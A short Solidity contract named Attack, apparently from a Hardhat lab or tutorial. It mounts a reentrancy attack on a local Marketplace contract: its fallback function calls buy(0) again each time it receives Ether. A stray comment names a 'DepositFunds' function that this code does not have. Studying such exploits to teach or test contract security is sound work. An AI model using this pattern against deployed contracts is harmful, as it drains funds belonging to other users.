// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;
import "./Marketplace.sol";
import "hardhat/console.sol";

contract Attack {
    Marketplace public marketPlace;

    constructor(address marketPlaceAddress) {
        marketPlace = Marketplace(marketPlaceAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        console.log("Fallback called");
        marketPlace.buy(0);
    }

    function attack() external payable {
        console.log("Attack starting");
        marketPlace.buy(0);
    }
}